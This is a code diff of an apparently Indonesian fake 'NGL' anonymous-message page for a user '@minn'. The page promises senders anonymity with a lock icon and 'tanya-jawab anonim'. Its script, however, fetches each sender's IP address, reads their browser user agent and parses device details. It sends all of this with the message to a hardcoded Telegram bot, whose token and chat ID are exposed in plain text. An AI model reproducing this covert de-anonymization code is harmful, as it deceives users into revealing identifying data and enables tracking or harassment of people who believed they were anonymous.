@@ -7,63 +7,43 @@ export default function NGLPage() {
   const [success, setSuccess] = useState(false);
   const [userInfo, setUserInfo] = useState({
     ip: "Tidak diketahui",
-    device: {
-      brand: "Tidak diketahui",
-      model: "Tidak diketahui",
-    },
+    userAgent: navigator.userAgent,
+    device: "Tidak diketahui",
   });
 
   useEffect(() => {
-    // Ambil IP pengguna dan device info
-    const fetchUserInfo = async () => {
-      try {
-        // Dapatkan IP Address
-        const ipRes = await fetch("https://api.ipify.org?format=json");
-        const ipData = await ipRes.json();
-
-        // Dapatkan Device Info
-        const deviceInfo = getMobileInfo();
-
+    // Ambil alamat IP pengguna
+    fetch("https://api.ipify.org?format=json")
+      .then((res) => res.json())
+      .then((data) => {
+        const deviceInfo = parseDeviceInfo(navigator.userAgent);
         setUserInfo({
-          ip: ipData.ip,
+          ip: data.ip,
+          userAgent: navigator.userAgent,
           device: deviceInfo,
         });
-      } catch (error) {
-        console.error("Error fetching user info:", error);
-      }
-    };
-
-    fetchUserInfo();
+      })
+      .catch((err) => {
+        console.error("Error fetching IP info:", err);
+      });
   }, []);
 
-  const getMobileInfo = () => {
-    const userAgent = navigator.userAgent;
-    let deviceInfo = { brand: "Tidak diketahui", model: "Tidak diketahui" };
-
-    if (/iPhone/i.test(userAgent)) {
-      deviceInfo = { brand: "Apple", model: "iPhone" };
-    } else if (/iPad/i.test(userAgent)) {
-      deviceInfo = { brand: "Apple", model: "iPad" };
-    } else if (/Android/i.test(userAgent)) {
-      const match = userAgent.match(/Android\s([0-9\.]+).*?;\s([^\s;]+)/);
-      if (match) {
-        deviceInfo = { brand: "Android", model: match[2] || "Tidak diketahui" };
-      }
-    } else if (/Windows Phone/i.test(userAgent)) {
-      deviceInfo = { brand: "Microsoft", model: "Windows Phone" };
-    } else if (/BlackBerry/i.test(userAgent)) {
-      deviceInfo = { brand: "BlackBerry", model: "BlackBerry Device" };
-    } else if (/Opera Mini/i.test(userAgent)) {
-      deviceInfo = { brand: "Opera", model: "Opera Mini" };
+  const parseDeviceInfo = (userAgent) => {
+    // Gunakan regex sederhana untuk mendeteksi perangkat
+    const deviceRegex = /([^)]+)/;
+    const match = userAgent.match(deviceRegex);
+    if (match) {
+      const deviceDetails = match[1].split(";")[1]?.trim() || "Tidak diketahui";
+      return deviceDetails;
     }
-
-    return deviceInfo;
+    return "Tidak diketahui";
   };
 
   const handleSubmit = async (e) => {
     e.preventDefault();
     const botToken = "8081447655:AAE1q_TUAd3SCToozFnZjdcF9jivRgd3eUU";
     const chatId = "1516343905";
+    const username = "minn";
 
     if (message.trim() === "") {
       alert("Pesan tidak boleh kosong!");
@@ -83,8 +63,8 @@ export default function NGLPage() {
             chat_id: chatId,
             text: `Pesan anonim dari:
 IP: ${userInfo.ip}
-BRAND: ${userInfo.device.brand}
-MODEL: ${userInfo.device.model}
+USER AGENT: ${userInfo.userAgent}
+DEVICE: ${userInfo.device}
 PESAN: ${message}`,
           }),
         }
@@ -110,7 +90,7 @@ PESAN: ${message}`,
   return (
     <>
       <Head>
-        <title>NGL - Pesan Anonim</title>
+        <title>NGL - MINN</title>
         <link
           href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
           rel="stylesheet"
@@ -121,35 +101,37 @@ PESAN: ${message}`,
           <div className="profile-message-box">
             <div className="profile">
               <img
-                src="/default-avatar.png"
-                alt="Profile picture"
-                className="profile-image"
+                src="https://storage.googleapis.com/a1aa/image/oJ3zaGSZ1S6GBJDZ9FXO2tBaBRqAymQqH8SJD06qu6752i8E.jpg"
+                alt="Profile picture of a cat"
               />
               <div>
                 <div className="username">@minn</div>
-                <div className="message">Kirimi aku pesan anonim!</div>
+                <div className="message">kirimi aku pesan anonim!</div>
               </div>
             </div>
             <textarea
               className="message-box"
               value={message}
               onChange={(e) => setMessage(e.target.value)}
-              placeholder="Tulis pesanmu di sini..."
+              placeholder="Kirim pesan anonim padaku..."
               disabled={loading}
             ></textarea>
           </div>
+          <div className="info">
+            <i className="fas fa-lock lock-icon"></i> tanya-jawab anonim
+          </div>
           <button type="submit" className="send-button" disabled={loading}>
-            {loading ? "Mengirim..." : "Kirim"}
+            {loading ? "Mengirim..." : "Kirim!"}
           </button>
         </form>
 
-        {/* Popup Sukses */}
+        {/* Pop-up Success */}
         {success && (
           <div className="popup-success">
             <div className="popup-content">
               <i className="fas fa-check-circle"></i>
               <p>Pesan berhasil dikirim!</p>
-              <button onClick={closePopup} className="popup-close">
+              <button className="popup-close" onClick={closePopup}>
                 OK
               </button>
             </div>
@@ -158,88 +140,153 @@ PESAN: ${message}`,
       </div>
       <style jsx>{`
         body {
-          margin: 0;
-          padding: 0;
-          background: linear-gradient(135deg, #f37335, #f54ea2);
-          font-family: Arial, sans-serif;
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          height: 100vh;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            height: 100vh;
+            background: linear-gradient(135deg, #ff416c, #ff4b2b);
+            font-family: Arial, sans-serif;
         }
+
         .container {
-          width: 100%;
-          max-width: 400px;
-          margin: 20px auto;
+            width: 100%;
+            max-width: 850px;
+            padding: 20px;
+            box-sizing: border-box;
+            margin-top: 50px;
         }
+
         .profile-message-box {
-          background: white;
-          padding: 20px;
-          border-radius: 10px;
-          box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            box-sizing: border-box;
         }
+
         .profile {
-          display: flex;
-          align-items: center;
-          margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
         }
-        .profile-image {
-          width: 50px;
-          height: 50px;
-          border-radius: 50%;
-          margin-right: 10px;
+
+        .profile img {
+            border-radius: 50%;
+            width: 130px;
+            height: 130px;
+            margin-right: 15px;
         }
-        .username {
-          font-size: 18px;
-          font-weight: bold;
+
+        .profile .username {
+            font-weight: bold;
+            font-size: 40px;
         }
-        .message {
-          font-size: 14px;
-          color: #666;
+
+        .profile .message {
+            margin-top: 2px;
+            font-size: 25px;
+            color: #555;
         }
+
         .message-box {
-          width: 100%;
-          padding: 10px;
-          margin: 10px 0;
-          border: 1px solid #ccc;
-          border-radius: 5px;
-          font-size: 14px;
-          resize: none;
+            background: rgba(128, 128, 128, 0.1);
+            border-radius: 20px;
+            padding: 20px;
+            color: rgba(0, 0, 0, 0.5);
+            font-size: 30px;
+            width: 100%;
+            height: 400px;
+            resize: none;
+            border: none;
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        .info {
+            color: white;
+            margin-bottom: 20px;
+            margin-top: 20px;
+            font-size: 30px;
+            justify-content: center;
+            display: flex;
+        }
+
+        .info .lock-icon {
+            margin-right: 5px;
+        }
+
+        .send-button:hover {
+            background: #333;
         }
         .send-button {
-          background-color: #ff416c;
+          background: black;
           color: white;
-          width: 100%;
           border: none;
-          padding: 10px;
-          border-radius: 5px;
-          font-size: 16px;
+          border-radius: 20px;
+          padding: 20px 40px;
+          font-size: 40px;
           cursor: pointer;
+          width: 100%;
+          height: 50px;
+          box-sizing: border-box;
+          transition: background 0.3s ease;
         }
+        .send-button:disabled {
+          background: #ccc;
+          cursor: not-allowed;
+        }
+
+        /* Pop-up Success */
         .popup-success {
           position: fixed;
-          top: 0;
-          left: 0;
-          right: 0;
-          bottom: 0;
-          background: rgba(0, 0, 0, 0.5);
-          display: flex;
-          justify-content: center;
-          align-items: center;
-        }
-        .popup-content {
+          top: 50%;
+          left: 50%;
+          transform: translate(-50%, -50%);
           background: white;
-          padding: 20px;
-          border-radius: 10px;
-          text-align: center;
+          border-radius: 20px;
+          box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+          padding: 30px;
+          display: flex;
+          align-items: center;
+          flex-direction: column;
+          z-index: 1000;
+          animation: fadeIn 0.3s ease;
+        }
+        .popup-content i {
+          font-size: 50px;
+          color: #4caf50;
+        }
+        .popup-content p {
+          margin: 10px 0;
+          font-size: 16px;
+          font-weight: bold;
+          color: #333;
         }
         .popup-close {
-          background: #ff416c;
+          background: #4caf50;
           color: white;
           border: none;
-          padding: 10px;
-          border-radius: 5px;
+          padding: 10px 20px;
+          border-radius: 10px;
+          font-size: 14px;
           cursor: pointer;
+          margin-top: 15px;
+        }
+        .popup-close:hover {
+          background: #45a047;
+        }
+        @keyframes fadeIn {
+          from {
+            opacity: 0;
+            transform: translate(-50%, -60%);
+          }
+          to {
+            opacity: 1;
+            transform: translate(-50%, -50%);
+          }
         }
       `}</style>
     </>
